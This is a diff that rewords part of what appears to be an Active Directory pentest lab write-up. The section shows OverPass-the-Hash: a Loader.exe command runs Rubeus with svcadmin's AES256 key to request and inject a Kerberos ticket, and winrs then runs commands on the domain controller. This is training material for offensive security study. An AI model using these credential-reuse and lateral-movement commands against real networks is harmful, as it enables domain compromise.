@@ -192,12 +192,11 @@ SID : S-1-5-21-719815819-3726368948-3917688648-1118
 
 ## Step 5: OverPass-the-Hash with Rubeus
 
-Finally, use OverPass-the-Hash to use svcadmin's credentials. 
-Run the below command from an elevated shell from the student VM. Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.)
+Finally, use OverPass-the-Hash to leverage svcadmin's credentials. Execute the following command on the student VM:
 
 - Prepare Arguments for Loader
 
-First, prepare encoded arguments for Rubeus using ArgSplit.bat:
+Generate encoded arguments for Rubeus using ArgSplit.bat:
 
 ```bash
 C:\Windows\system32>C:\AD\Tools\ArgSplit.bat
@@ -215,7 +214,7 @@ These commands set up a variable Pwn with encoded arguments for Rubeus.
 
 - Execute Loader with Rubeus
 
-Run Loader.exe with Rubeus.exe and pass the encoded arguments to request a TGT (Ticket Granting Ticket) using svcadmin's credentials:
+Run Loader.exe with Rubeus.exe, passing encoded arguments to request a TGT using svcadmin's credentials:
 
 ```bash
 C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
@@ -230,16 +229,18 @@ C:\Windows\system32>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %P
 
 - Execution and Output
 
-Upon successful execution, Rubeus requests a TGT and imports it into the current session. The output includes:
+Upon successful execution, Rubeus requests a TGT and imports it into the current session. Example output includes:
 
+```bash
 `ServiceName`: The Kerberos service name for which the TGT was requested (krbtgt/dollarcorp.moneycorp.local).
 `ServiceRealm`: The realm associated with the Kerberos service (DOLLARCORP.MONEYCORP.LOCAL).
 `UserName`: The user for whom the TGT was requested (svcadmin).
+```
 
-After obtaining the TGT, you can access resources within the domain using winrs or similar commands. For example:
+After obtaining the TGT, access domain resources using tools like winrs:
 
 ```bash
 C:\Windows\system32>winrs -r:dcorp-dc cmd /c set username
 USERNAME=svcadmin
 ```
-Here, winrs is used to run a command on the domain controller (dcorp-dc), confirming that the credentials of svcadmin are successfully used without direct access to dcorp-mgmt from the student's machine (172.16.100.X).
+This confirms successful use of svcadmin's credentials without direct access to dcorp-mgmt from the student's machine (172.16.100.X).
